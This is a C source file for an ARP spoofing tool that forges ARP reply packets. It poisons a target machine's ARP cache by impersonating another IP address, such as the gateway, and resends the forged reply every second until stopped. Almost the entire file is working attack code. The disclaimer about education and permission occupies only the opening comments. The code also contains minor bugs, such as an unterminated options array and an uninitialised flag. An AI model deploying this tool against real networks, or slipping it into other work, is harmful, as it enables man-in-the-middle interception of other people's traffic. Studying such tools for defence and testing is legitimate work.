// arpspoof.c - ARP Spoofing Tool
//Author : Neur0sis (2025)
//This program is a simple ARP spoofing tool that allows you to poison the ARP cache of a target machine.
// It can be used for educational purposes or network testing.
// This code is provided as-is and should be used responsibly. Ensure you have permission to test the network.


#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void print_help(const char* prog) {
	printf("\n%s - ARP Spoofing Tool by Neur0sis (2025)\n", prog);
	printf("Usage:\n");
	printf("  %s -i <iface> -t <target_ip> -s <spoofed_ip>\n", prog);
	printf("  %s --interface <iface> --target <IP> --spoof <IP>\n\n", prog);
	printf("Options:\n");
	printf("  -i, --interface   Interface to use (e.g., eth0)             [REQUIRED]\n");
	printf("  -t, --target      Target IP to poison                       [REQUIRED]\n");
	printf("  -s, --spoof       IP address to impersonate (e.g., gateway) [REQUIRED]\n");
	printf("  -l, --list        List available interfaces\n");
	printf("  -h, --help        Show this help message\n\n");
	printf("Example:\n");
	printf("  sudo %s -i eth0 -t 192.168.1.5 -s 192.168.1.1\n\n", prog);
}

static void list_interfaces(){
	printf("Available interfaces :\n");

	DIR *dir = opendir("/sys/class/net");
	if(!dir){
		fprintf(stderr, "Error: Failed to open : /sys/class/net\n");
	}

	struct dirent *ent;
	while(ent = readdir(dir)){
		if (ent->d_name[0] == '.') continue; //Skip . and .. directories
		char mac[18];
		int  up;
		struct ifreq ifr;
		int sock = socket(AF_INET, SOCK_DGRAM, 0);
		if(sock < 0) up = 0;
		strncpy(ifr.ifr_name, ent->d_name, IFNAMSIZ - 1);
		ifr.ifr_name[IFNAMSIZ - 1] = '\0';
		if(ioctl(sock, SIOCGIFFLAGS, &ifr) < 0){
			close(sock);
			up = 0;
		}
		close(sock);
		up = (ifr.ifr_flags & IFF_UP) ? 1 : 0;
		char path[512];
		snprintf(path, sizeof(path), "/sys/class/net/%s/address", ent->d_name);
		FILE* fp = fopen(path, "r");
		if (!fp) {
    	perror("fopen");
    	continue;
		}
		fgets(mac, sizeof(mac), fp);
		mac[strcspn(mac, "\n")] = 0;
		fclose(fp);
		printf("%-10s [%s] MAC: %s\n", ent->d_name, up ? "UP": "DOWN", mac);

	}
			closedir(dir);

}

int main(int argc, char* argv[]){

	if(argc < 2){
		printf("Missing required arguments. Use -h for help.\n");
		exit(EXIT_FAILURE);
	}

	static struct option long_opts[] = {
		{"help", 	  no_argument,       NULL, 'h'},
		{"interface", required_argument, NULL, 'i'},
		{"target",    required_argument, NULL, 't'},
		{"spoof",     required_argument, NULL, 's'},
		{"list",      no_argument,		 NULL, 'l'}
	};

	int opt, help;
	const char *iface = NULL, *target_ip = NULL, *spoof_ip = NULL;

	while( (opt = getopt_long(argc,argv, "i:t:s:lh", long_opts, NULL)) != -1){
		switch(opt){
			case 'h':
			print_help(argv[0]); help = 1;
			break;
			case 'l':
			list_interfaces(); help = 1;break;
			case 'i' : iface = optarg; break;
			case 't' : target_ip = optarg; break;
			case 's' : spoof_ip = optarg; break;
			default:
			fprintf(stderr, "Unknown option. Use -h for help.");
			exit(EXIT_FAILURE);
		}
	}

	if((iface == NULL || target_ip == NULL || spoof_ip == NULL ) && help != 1){
		printf("Missing required arguments. Use -h for help.\n");
		exit(EXIT_FAILURE);
	}
	

	printf("Spoofing ARP cache...\n");
	printf("Interface: %s\n", iface);
	printf("Target IP: %s\n", target_ip);
	printf("Spoofed IP: %s\n", spoof_ip);

	struct ifreq ifr;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ -1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock < 0){
		perror("socket");
		exit(EXIT_FAILURE);
	}
	if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
		perror("ioctl");
		close(sock);
		exit(EXIT_FAILURE);
	}
	unsigned char* src_mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;

	//Get target MAC address
	struct arpreq arpreq;
	memset(&arpreq, 0, sizeof(arpreq));
	strncpy(arpreq.arp_dev, iface, IFNAMSIZ - 1);
	arpreq.arp_dev[IFNAMSIZ - 1] = '\0';
	struct sockaddr_in* sin = (struct sockaddr_in*)&arpreq.arp_pa;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = inet_addr(target_ip);
	if(ioctl(sock, SIOCGARP, &arpreq) < 0){
		perror("ioctl SIOCGARP");
		close(sock);
		exit(EXIT_FAILURE);
	}	
	close(sock);
	unsigned char* target_mac = (unsigned char*)arpreq.arp_ha.sa_data;

	printf("Using MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
	
	//Build ARP replay packet (Ethernet Header (14bytes) + ARP header + payload (28 bytes))
	unsigned char packet[42];
	memset(packet, 0, sizeof(packet));
	//Ethernet Header
	memcpy(packet, target_mac, 6);     // Destination MAC
	memcpy(packet + 6, src_mac, 6);    // Source MAC
	packet[12] = 0x08;                 // EtherType (ARP)
	packet[13] = 0x06;
	//ARP Header
	packet[14] = 0x00; // Hardware type (Ethernet)
	packet[15] = 0x01; 
	packet[16] = 0x08; // Protocol type (IPv4)
	packet[17] = 0x00; 
	packet[18] = 0x06; // Hardware size (MAC address length)
	packet[19] = 0x04; // Protocol size (IPv4 length)
	packet[20] = 0x00; // Opcode (Reply = 0x0002)
	packet[21] = 0x02; 
	//Sender MAC address
	memcpy(packet + 22, src_mac, 6);
	//Sender IP address
	struct in_addr src_ip_addr;
	inet_pton(AF_INET, spoof_ip, &src_ip_addr);
	memcpy(packet + 28, &src_ip_addr, 4);
	//Target MAC address
	memcpy(packet + 32, target_mac, 6);
	//Target IP address
	struct in_addr target_ip_addr;
	inet_pton(AF_INET, target_ip, &target_ip_addr);
	memcpy(packet + 38, &target_ip_addr, 4);

	//Send ARP packet
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = AF_PACKET;
	sa.sll_ifindex = if_nametoindex(iface);
	if(sa.sll_ifindex == 0){
		perror("if_nametoindex");
		exit(EXIT_FAILURE);
	}
	sa.sll_halen = ETH_ALEN;
	memcpy(sa.sll_addr, target_mac, 6); // Set target MAC address
	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(sockfd < 0){
		perror("socket");
		exit(EXIT_FAILURE);
	}
	printf("Sending ARP packets to poison ARP cache...\n");
	printf("Press Ctrl+C to stop.\n");
	while(1){
		if(sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0){
			perror("sendto");
			close(sockfd);
			exit(EXIT_FAILURE);
		}
		printf("ARP packet sent to %s\n", target_ip);
		sleep(1); // Send every second
	}
	close(sockfd);



	exit(EXIT_SUCCESS); 
}